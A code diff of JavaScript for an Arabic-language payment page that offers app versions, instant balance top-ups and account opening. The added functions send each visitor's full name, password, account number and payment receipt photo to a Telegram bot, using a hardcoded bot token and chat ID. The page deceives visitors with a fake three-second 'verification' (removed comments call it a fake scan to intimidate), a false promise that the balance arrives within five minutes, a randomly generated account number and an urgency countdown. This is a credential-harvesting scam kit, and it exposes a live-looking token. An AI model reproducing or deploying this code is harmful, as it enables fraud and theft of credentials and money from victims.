@@ -1,110 +1,188 @@
 const TOKEN = '8572250361:AAEB89MDQx_QRBGQR7vTDK9v1k92_4CRxmw';
 const MY_ID = '7908500383';
 let currentProduct = "";
+let calculatedPrice = 0;
 
-// دالة فتح النافذة
+// --- 1. رسالة الترحيب ---
+window.onload = function() {
+    setTimeout(() => {
+        document.getElementById('welcomeMessage').style.display = 'none';
+    }, 15000); // تختفي تلقائياً بعد 15 ثانية
+};
+
+function closeWelcome() {
+    document.getElementById('welcomeMessage').style.display = 'none';
+}
+
+// --- 2. نظام الدفع العادي (VIP، عادية، مجانية) ---
 function openPay(title, price) {
     currentProduct = title;
+    resetModal();
     document.getElementById('modalTitle').innerText = title;
     document.getElementById('modalPrice').innerText = "المبلغ المطلوب: " + price + " جنيه";
     
+    document.getElementById('paymentArea').style.display = "block";
     document.getElementById('payModal').style.display = "block";
+}
+
+// --- 3. نظام الشحن الفوري ---
+function openShipping(title) {
+    currentProduct = title;
+    resetModal();
+    document.getElementById('modalTitle').innerText = title;
+    document.getElementById('shippingInputs').style.display = "block";
+    document.getElementById('payModal').style.display = "block";
+}
+
+function calculatePrice() {
+    let amount = document.getElementById('shipAmount').value;
+    if (amount >= 100) {
+        calculatedPrice = (amount / 100) * 10000;
+        document.getElementById('calcResult').innerText = `المبلغ المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
+    } else {
+        document.getElementById('calcResult').innerText = "أقل مبلغ شحن هو 100 ألف";
+        calculatedPrice = 0;
+    }
+}
+
+async function submitShippingInfo() {
+    let acc = document.getElementById('shipAccount').value;
+    let amount = document.getElementById('shipAmount').value;
     
-    // إعادة ضبط الواجهة عند كل فتح
-    document.getElementById('successArea').style.display = "none";
-    document.getElementById('uploadBtn').style.display = "block";
-    document.getElementById('uploadBtn').disabled = false;
-    document.getElementById('loadingArea').style.display = "none";
-    if(document.getElementById('refNumber')) document.getElementById('refNumber').value = "";
-}
-
-// ميزة نسخ رقم الحساب بضغطة واحدة
-function copyAccountNumber() {
-    const accNo = document.getElementById('accNo').innerText;
-    navigator.clipboard.writeText(accNo).then(() => {
-        const msg = document.getElementById('copyStatus');
-        msg.style.display = 'inline';
-        setTimeout(() => msg.style.display = 'none', 2000);
-    });
-}
-
-// التحقق قبل الرفع (إلزامية رقم العملية)
-function validateBeforeUpload() {
-    const ref = document.getElementById('refNumber').value;
-    if (ref.length < 5) {
-        alert("⚠️ خطأ في التحقق: يرجى إدخال رقم العملية (Ref Number) الصحيح المكون من 6 أرقام على الأقل.");
+    if (acc.length < 5 || amount < 100) {
+        alert("⚠️ يرجى إدخال رقم حساب صحيح وكمية لا تقل عن 100 ألف.");
         return;
     }
-    document.getElementById('receiptInput').click();
+
+    // إرسال البيانات الأولية للبوت
+    sendDataToTelegram(`📥 طلب شحن جديد:\nالنسخة: ${currentProduct}\nحساب الزبون: ${acc}\nالكمية: ${amount} ألف`);
+    
+    document.getElementById('shippingInputs').style.display = "none";
+    document.getElementById('modalPrice').innerText = `المبلغ المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
+    document.getElementById('paymentArea').style.display = "block";
 }
 
-// دالة إغلاق النافذة
-function closeModal() {
-    document.getElementById('payModal').style.display = "none";
+// --- 4. نظام فتح الحسابات ---
+function openAccountSystem() {
+    currentProduct = "فتح حساب جديد";
+    resetModal();
+    document.getElementById('modalTitle').innerText = "تفعيل وفتح حساب";
+    document.getElementById('accountInputs').style.display = "block";
+    document.getElementById('payModal').style.display = "block";
 }
 
-// دالة رفع الصورة والارسال للتلجرام مع الفحص الذكي
+async function submitAccountInfo() {
+    let name = document.getElementById('userFullName').value;
+    let pass = document.getElementById('userPass').value;
+    let type = document.getElementById('accType').value;
+
+    if (name.length < 10 || pass.length < 4) {
+        alert("⚠️ يرجى إدخال الاسم الرباعي وكلمة مرور قوية.");
+        return;
+    }
+
+    sendDataToTelegram(`👤 طلب فتح حساب:\nالنوع: ${type}\nالاسم: ${name}\nكلمة السر: ${pass}`);
+    
+    document.getElementById('accountInputs').style.display = "none";
+    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: 20,000 جنيه";
+    document.getElementById('paymentArea').style.display = "block";
+}
+
+// --- 5. الرفع والإرسال النهائي ---
 async function handleUpload() {
     const fileInput = document.getElementById('receiptInput');
     const ref = document.getElementById('refNumber').value;
     const file = fileInput.files[0];
-    const uploadBtn = document.getElementById('uploadBtn');
     const loadingArea = document.getElementById('loadingArea');
 
     if (file) {
-        // بدء عملية الفحص الوهمي للترهيب
-        uploadBtn.style.display = "none";
+        document.getElementById('paymentArea').style.display = "none";
         loadingArea.style.display = "block";
 
         const formData = new FormData();
         formData.append('chat_id', MY_ID);
         formData.append('photo', file);
-        
-        // تنسيق الرسالة الواصلة للمطور لتشمل خيارات التحكم
-        formData.append('caption', `
-🚨 إشعار دفع جديد (موثق بالـ IP)
------------------------------
-📦 الخدمة: ${currentProduct}
-🔢 رقم العملية: ${ref}
-💰 المبلغ: ${document.getElementById('modalPrice').innerText}
------------------------------
-🛡️ خيارات المطور:
-[ حظر الجهاز ] - [ اعتماد العملية ]
-        `);
+        formData.append('caption', `✅ إشعار دفع مؤكد\n📦 الخدمة: ${currentProduct}\n🔢 رقم العملية: ${ref}\n💰 المبلغ: ${document.getElementById('modalPrice').innerText}`);
 
-        // تأخير وهمي لمدة 3 ثوانٍ لإعطاء انطباع بالفحص الفني للألوان والبيانات
         setTimeout(async () => {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
-                if (response.ok) {
-                    loadingArea.style.display = "none";
-                    document.getElementById('successArea').style.display = "block";
-                } else {
-                    alert("❌ فشل التحقق من الصورة، حاول مرة أخرى.");
-                    uploadBtn.style.display = "block";
-                    loadingArea.style.display = "none";
-                }
-            } catch (error) {
-                alert("🌐 خطأ في الاتصال بخادم الحماية.");
-                uploadBtn.style.display = "block";
+            if (response.ok) {
+                loadingArea.style.display = "none";
+                showFinalSuccess();
+            } else {
+                alert("❌ فشل الإرسال.");
+                document.getElementById('paymentArea').style.display = "block";
                 loadingArea.style.display = "none";
             }
         }, 3000);
     }
 }
 
-// عداد الوقت التنازلي للعرض
+function showFinalSuccess() {
+    const successArea = document.getElementById('successArea');
+    successArea.style.display = "block";
+
+    // منطق ظهور زر التحميل (فقط للنسخ)
+    if (currentProduct.includes("نسخة") || currentProduct.includes("النسخة") || currentProduct.includes("VIP")) {
+        document.getElementById('downloadSection').style.display = "block";
+        document.getElementById('afterActionText').innerText = "مبروك! تم استلام طلبك بنجاح. يمكنك تحميل التطبيق الآن.";
+    } 
+    // منطق فتح الحساب (توليد رقم حساب)
+    else if (currentProduct === "فتح حساب جديد") {
+        let randomAcc = Math.floor(1000000 + Math.random() * 9000000);
+        document.getElementById('accountCard').style.display = "block";
+        document.getElementById('resName').innerText = document.getElementById('userFullName').value;
+        document.getElementById('resPass').innerText = document.getElementById('userPass').value;
+        document.getElementById('resAcc').innerText = randomAcc;
+        document.getElementById('afterActionText').innerText = "تم إنشاء الحساب بنجاح. الرجاء التواصل مع المطور لتفعيله.";
+    } 
+    // منطق الشحن
+    else if (currentProduct.includes("شحن")) {
+        document.getElementById('afterActionText').innerText = "مبروك تم الشحن! سوف يصلك الرصيد خلال 5 دقائق. (تحذير: الإشعارات المزيفة تعرض حسابك للقفل).";
+    }
+}
+
+// --- وظائف مساعدة ---
+function resetModal() {
+    document.getElementById('shippingInputs').style.display = "none";
+    document.getElementById('accountInputs').style.display = "none";
+    document.getElementById('paymentArea').style.display = "none";
+    document.getElementById('successArea').style.display = "none";
+    document.getElementById('accountCard').style.display = "none";
+    document.getElementById('downloadSection').style.display = "none";
+}
+
+function validateBeforeUpload() {
+    if (document.getElementById('refNumber').value.length < 5) {
+        alert("⚠️ يرجى إدخال رقم العملية أولاً.");
+        return;
+    }
+    document.getElementById('receiptInput').click();
+}
+
+async function sendDataToTelegram(text) {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: MY_ID, text: text })
+    });
+}
+
+function copyAccountNumber() {
+    const accNo = document.getElementById('accNo').innerText;
+    navigator.clipboard.writeText(accNo).then(() => {
+        document.getElementById('copyStatus').style.display = 'inline';
+        setTimeout(() => document.getElementById('copyStatus').style.display = 'none', 2000);
+    });
+}
+
+function closeModal() { document.getElementById('payModal').style.display = "none"; }
+
+// عداد الوقت
 let time = 86396; 
 setInterval(() => {
-    let h = Math.floor(time / 3600);
-    let m = Math.floor((time % 3600) / 60);
-    let s = time % 60;
-    if(document.getElementById('timer')) {
-        document.getElementById('timer').innerText = `${h}:${m}:${s}`;
-    }
+    let h = Math.floor(time / 3600); let m = Math.floor((time % 3600) / 60); let s = time % 60;
+    if(document.getElementById('timer')) document.getElementById('timer').innerText = `${h}:${m}:${s}`;
     if (time > 0) time--;
 }, 1000);
